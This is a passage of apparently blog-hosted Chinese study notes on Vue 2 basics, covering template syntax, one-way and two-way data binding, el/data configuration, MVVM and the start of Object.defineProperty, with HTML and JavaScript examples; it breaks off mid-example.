      <link href="/2022/07/19/Vue2/"/>
      <url>/2022/07/19/Vue2/</url>
      
        <content type="html"><![CDATA[<h1 id="Vue核心"><a href="#Vue核心" class="headerlink" title="Vue核心"></a>Vue核心</h1><h2 id="Vue简介"><a href="#Vue简介" class="headerlink" title="Vue简介"></a>Vue简介</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p><strong>一套用于<code>构建用户界面</code>的<code>渐进式</code>JavaScript框架</strong><br><strong>构建用户界面</strong>：将数据通过某种方法编程用户可以看到的界面<br><strong>渐进式</strong>：Vue可以自底向上逐层的应用（简单应用：只需一个轻量小巧的核心库；–&gt; 复杂应用：可以引入各式各样的Vue插件）</p><h3 id="Vue-的特点"><a href="#Vue-的特点" class="headerlink" title="Vue 的特点"></a>Vue 的特点</h3><ul><li>1.遵循<code>MVVM</code>模式</li><li>2.采用<code>组件化</code>模式，提高代码复用率，且让代码更好的维护</li><li>3.<code>声明式</code>编码，让编码人员无需直接操作DOM，提高开发效率</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 命令式编码 */</span></span><br><span class="line"><span class="comment">// 准备html字符串</span></span><br><span class="line"><span class="keyword">let</span> htmlStr = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="comment">// 遍历数据拼接html字符串</span></span><br><span class="line">persons.<span class="title function_">forEach</span>(<span class="function"><span class="params">p</span> =&gt;</span> &#123;</span><br><span class="line">    htmlStr += <span class="string">`&lt;li&gt;<span class="subst">$&#123;p.id&#125;</span> - <span class="subst">$&#123;p.name&#125;</span> - <span class="subst">$&#123;p.age&#125;</span>&lt;/li&gt;`</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// 获取list元素</span></span><br><span class="line"><span class="keyword">let</span> list = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;list&#x27;</span>)</span><br><span class="line"><span class="comment">// 修改内容（亲自操作DOM）</span></span><br><span class="line">list.<span class="property">innerHTML</span> = htmlStr</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--声明式编码--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">id</span>=<span class="string">&quot;list&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;p in persons&quot;</span>&gt;</span></span><br><span class="line">    &#123;&#123; p.id &#125;&#125; - &#123;&#123; p.name &#125;&#125; - &#123;&#123; p.age &#125;&#125; </span><br><span class="line">  <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>4.使用<code>虚拟DOM</code>+优秀的<code>Diff算法</code>，尽量复用DOM节点</li></ul><p><img src="/images/js%E5%8E%9F%E7%94%9F.jpg" alt="Image text"><br><strong>旧的虚拟DOM和新的虚拟DOM进行比较，比较叫<code>Diff</code></strong><br><img src="/images/vue%E5%AE%9E%E7%8E%B0.jpg" alt="Image text"></p><p><strong>.js代表源码文件，文件可读性好，便于调试和修改，体积大，传输时间长</strong><br><strong>min.js代表压缩版的文件，文件可读性差，所占用空间相对较小，可用于源码防窃</strong><br><strong><a href="http://127.0.0.1：代表本机">http://127.0.0.1：代表本机</a></strong></p><h2 id="初识-Vue"><a href="#初识-Vue" class="headerlink" title="初识 Vue"></a>初识 Vue</h2><ul><li>Vue实例和容器是一一对应的</li></ul><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>初识Vue<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 引入Vue --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue@2.7.7/dist/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">初识Vue：</span></span><br><span class="line"><span class="comment">1.想让Vue工作，就必须创建一个Vue实例，且要传入一个配置对象；</span></span><br><span class="line"><span class="comment">2.root容器里的代码依然符合html规范，只不过混入了一些特殊的Vue语法；</span></span><br><span class="line"><span class="comment">3.root容器里的代码被称为【Vue模板】；</span></span><br><span class="line"><span class="comment">4.Vue实例和容器是一一对应的；</span></span><br><span class="line"><span class="comment">5.真实开发中只有一个Vue实例，并且会配合着组件一起使用；</span></span><br><span class="line"><span class="comment">6.&#123;&#123;xxx&#125;&#125;中的xxx要写js表达式，且xxx可以自动读取到data中的所有属性；</span></span><br><span class="line"><span class="comment">7.一旦data中的数据发生改变，那么页面中用到该数据的地方也会自动更新；</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">注意区分：js表达式 和 js代码(语句)</span></span><br><span class="line"><span class="comment">1.表达式：一个表达式会产生一个值，可以放在任何一个需要值的地方（在左侧可以接到一个值const x = ）：</span></span><br><span class="line"><span class="comment">(1). a</span></span><br><span class="line"><span class="comment">(2). a+b</span></span><br><span class="line"><span class="comment">(3). demo(1) // 函数调用表达式</span></span><br><span class="line"><span class="comment">(4). x === y ? &#x27;a&#x27; : &#x27;b&#x27;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">2.js代码(语句)：控制代码走</span></span><br><span class="line"><span class="comment">(1). if()&#123;&#125;</span></span><br><span class="line"><span class="comment">(2). for()&#123;&#125;</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 准备好一个容器: 1、为vue提供模板，2、把vue工作成果往哪放 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;demo&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello，&#123;&#123;name.toUpperCase()&#125;&#125;，&#123;&#123;address&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 页面显示&#123;&#123; name &#125;&#125; --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>&#123;&#123; name &#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> &gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="title class_">Vue</span>.<span class="property">config</span>.<span class="property">productionTip</span> = <span class="literal">false</span> <span class="comment">// 阻止 vue 在启动时生成生产提示。</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// Vue为构造函数，new一个实例</span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 创建Vue实例，里面传配置对象</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">el</span>:<span class="string">&#x27;#demo&#x27;</span>, <span class="comment">// 容器与实例建立关系，el用于指定当前Vue实例为哪个容器服务，值通常为css选择器字符串，也可以使用document.getElementById(&#x27;demo&#x27;)。</span></span></span><br><span class="line"><span class="language-javascript"><span class="attr">data</span>:&#123; <span class="comment">// data中用于存储数据，数据供el所指定的容器去使用，值我们暂时先写成一个对象。</span></span></span><br><span class="line"><span class="language-javascript"><span class="attr">name</span>:<span class="string">&#x27;atguigu&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">address</span>:<span class="string">&#x27;北京&#x27;</span></span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="模板语法"><a href="#模板语法" class="headerlink" title="模板语法"></a>模板语法</h2><ul><li>Vue模板语法有2大类：<ul><li>1.<code>插值</code>语法（双大括号表达式）：<ul><li>功能：用于解析<code>标签体</code>内容。</li><li>写法：<code>{{xxx}}</code>，xxx是js表达式，且可以直接读取到data中的所有属性。</li></ul></li><li>2.<code>指令</code>语法（以 v-开头）：<ul><li>功能：用于解析<code>标签</code>（包括：标签属性、标签体内容、绑定事件…..）。</li><li>举例：v-bind:href=”xxx” 或  简写为 :href=”xxx”，xxx同样要写js表达式(读取一个变量)，且可以直接读取到data中的所有属性。</li><li>备注：Vue中有很多的指令，且形式都是：v-????。</li></ul></li></ul></li></ul><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>模板语法<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 引入Vue --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 准备好一个容器--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>插值语法<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>你好，&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>指令语法<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">v-bind:href</span>=<span class="string">&quot;school.url.toUpperCase()&quot;</span> <span class="attr">x</span>=<span class="string">&quot;hello&quot;</span>&gt;</span>点我去&#123;&#123;school.name&#125;&#125;学习1<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">:href</span>=<span class="string">&quot;school.url&quot;</span> <span class="attr">x</span>=<span class="string">&quot;hello&quot;</span>&gt;</span>点我去&#123;&#123;school.name&#125;&#125;学习2<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="title class_">Vue</span>.<span class="property">config</span>.<span class="property">productionTip</span> = <span class="literal">false</span> <span class="comment">//阻止 vue 在启动时生成生产提示。</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">el</span>:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">name</span>:<span class="string">&#x27;jack&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">school</span>:&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">name</span>:<span class="string">&#x27;尚硅谷&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">url</span>:<span class="string">&#x27;http://www.atguigu.com&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="数据绑定"><a href="#数据绑定" class="headerlink" title="数据绑定"></a>数据绑定</h2><ul><li>Vue中有2种数据绑定的方式：<ul><li>1.<code>单向</code>绑定(<code>v-bind</code>)：<code>数据</code>只能从data<code>流向页面</code>。</li><li>2.<code>双向</code>绑定(<code>v-model</code>)：<code>数据</code>不仅能从data<code>流向页面</code>，还可以从<code>页面流向data</code>。</li><li>备注：<ul><li>1.<code>双</code>向绑定一般都应用在<code>表单类元素（输入类元素）</code>上（如：input、select等）</li><li>2.<code>v-model:value</code> 可以简写为 <code>v-model</code>，因为v-model<code>默认</code>收集的就是<code>value值</code>。</li></ul></li></ul></li></ul><p><img src="/images/v-bind.jpg" alt="Image text"><br><img src="/images/v-model.jpg" alt="Image text"></p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>数据绑定<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 引入Vue --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 准备好一个容器--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 普通写法 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 单向数据绑定：&lt;input type=&quot;text&quot; v-bind:value=&quot;name&quot;&gt;&lt;br/&gt;</span></span><br><span class="line"><span class="comment">双向数据绑定：&lt;input type=&quot;text&quot; v-model:value=&quot;name&quot;&gt;&lt;br/&gt; --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 简写 --&gt;</span></span><br><span class="line">单向数据绑定：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">:value</span>=<span class="string">&quot;name&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">双向数据绑定：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;name&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 如下代码是错误的，因为v-model只能应用在表单类元素（输入类元素）上，v-model作用在属性value上 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- &lt;h2 v-model:x=&quot;name&quot;&gt;你好啊&lt;/h2&gt; --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="title class_">Vue</span>.<span class="property">config</span>.<span class="property">productionTip</span> = <span class="literal">false</span> <span class="comment">//阻止 vue 在启动时生成生产提示。</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">el</span>:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">name</span>:<span class="string">&#x27;尚硅谷&#x27;</span></span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="el与data的两种写法"><a href="#el与data的两种写法" class="headerlink" title="el与data的两种写法"></a>el与data的两种写法</h2><ul><li>data与el的2种写法<ul><li>1.el有2种写法<ul><li>(1).<code>new Vue</code>时候<code>配置el属性</code>。</li><li>(2).先创建Vue实例，随后再通过<code>vm.$mount(&#39;#root&#39;)</code>指定<code>el的值</code>。</li></ul></li><li>2.data有2种写法<ul><li>(1).<code>对象式</code></li><li>(2).<code>函数式</code>，必须返回一个对象 </li><li>如何选择：目前哪种写法都可以，以后学习到<code>组件</code>时，data必须使用<code>函数式</code>，否则会报错。</li></ul></li><li>3.一个重要的原则：<ul><li>由<code>Vue管理的函数</code>，一定<code>不要写箭头函数</code>，一旦写了箭头函数，<code>this</code>就不再是<code>Vue实例</code>了，而是window。</li></ul></li></ul></li></ul><p><img src="/images/vue.jpg" alt="Image text"></p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>el与data的两种写法<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 引入Vue --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 准备好一个容器--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span>&gt;</span>你好，&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="title class_">Vue</span>.<span class="property">config</span>.<span class="property">productionTip</span> = <span class="literal">false</span> <span class="comment">//阻止 vue 在启动时生成生产提示。</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="comment">//el的两种写法</span></span></span><br><span class="line"><span class="language-javascript">   <span class="keyword">const</span> v = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="comment">//el:&#x27;#root&#x27;, //第一种写法</span></span></span><br><span class="line"><span class="language-javascript">      <span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="attr">name</span>:<span class="string">&#x27;尚硅谷&#x27;</span></span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;)</span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">console</span>.<span class="title function_">log</span>(v)</span></span><br><span class="line"><span class="language-javascript">  v.$mount(<span class="string">&#x27;#root&#x27;</span>) <span class="comment">//第二种写法 </span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="comment">//data的两种写法</span></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">el</span>:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//data的第一种写法：对象式</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">/* data:&#123;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">        name:&#x27;尚硅谷&#x27;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">    &#125; */</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//data的第二种写法：函数式,</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//不能是箭头函数，箭头函数没有自己的this，this指向会变成window</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//data:function()&#123;&#125;</span></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">data</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;@@@&#x27;</span>,<span class="variable language_">this</span>) <span class="comment">//此处的this是Vue实例对象</span></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">return</span>&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">name</span>:<span class="string">&#x27;尚硅谷&#x27;</span></span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/images/vue%E5%8E%9F%E5%9E%8B%E9%93%BE.png" alt="Image text"></p><h2 id="理解MVVM"><a href="#理解MVVM" class="headerlink" title="理解MVVM"></a>理解MVVM</h2><ul><li><ol><li>M：模型(Model) ：data中的数据</li></ol></li><li><ol start="2"><li>V：视图(View) ：模板代码</li></ol></li><li><ol start="3"><li>VM：视图模型(ViewModel)：Vue实例<br><img src="/images/MVVM.jpg" alt="Image text"><br><img src="/images/MVVM2.jpg" alt="Image text"></li></ol></li><li><p>观察发现： </p><ul><li>1.<code>data</code>中所有的<code>属性</code>，最后都出现在了<code>vm</code>身上。</li><li>2.``vm身上所有的<code>属性</code> 及 <code>Vue原型</code>上所有<code>属性</code>，在<code>Vue模板</code>中都可以直接<code>使用</code>。</li></ul></li></ul><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>理解MVVM<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 引入Vue --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 准备好一个容器--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>学校名称：&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>学校地址：&#123;&#123;address&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- &lt;h1&gt;测试一下1：&#123;&#123;1+1&#125;&#125;&lt;/h1&gt;</span></span><br><span class="line"><span class="comment">&lt;h1&gt;测试一下2：&#123;&#123;$options&#125;&#125;&lt;/h1&gt;</span></span><br><span class="line"><span class="comment">&lt;h1&gt;测试一下3：&#123;&#123;$emit&#125;&#125;&lt;/h1&gt;</span></span><br><span class="line"><span class="comment">&lt;h1&gt;测试一下4：&#123;&#123;_c&#125;&#125;&lt;/h1&gt; --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="title class_">Vue</span>.<span class="property">config</span>.<span class="property">productionTip</span> = <span class="literal">false</span> <span class="comment">//阻止 vue 在启动时生成生产提示。</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> vm = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">el</span>:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">name</span>:<span class="string">&#x27;尚硅谷&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">address</span>:<span class="string">&#x27;北京&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(vm)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="数据代理"><a href="#数据代理" class="headerlink" title="数据代理"></a>数据代理</h2><h3 id="回顾Object-defineproperty方法"><a href="#回顾Object-defineproperty方法" class="headerlink" title="回顾Object.defineproperty方法"></a>回顾Object.defineproperty方法</h3><ul><li>三个参数<ul><li>1.给哪个对象添加属性</li><li>2.添加的属性名</li><li>3.配置项对象</li></ul></li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> number = <span class="number">18</span></span><br><span class="line"><span class="keyword">let</span> person = &#123;</span><br><span class="line">  <span class="attr">name</span>:<span class="string">&#x27;张三&#x27;</span>,</span><br><span class="line">  <span class="attr">sex</span>:<span class="string">&#x27;男&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(person,<span class="string">&#x27;age&#x27;</span>,&#123;</span><br><span class="line">  <span class="comment">// value:18,</span></span><br><span class="line">  <span class="comment">// 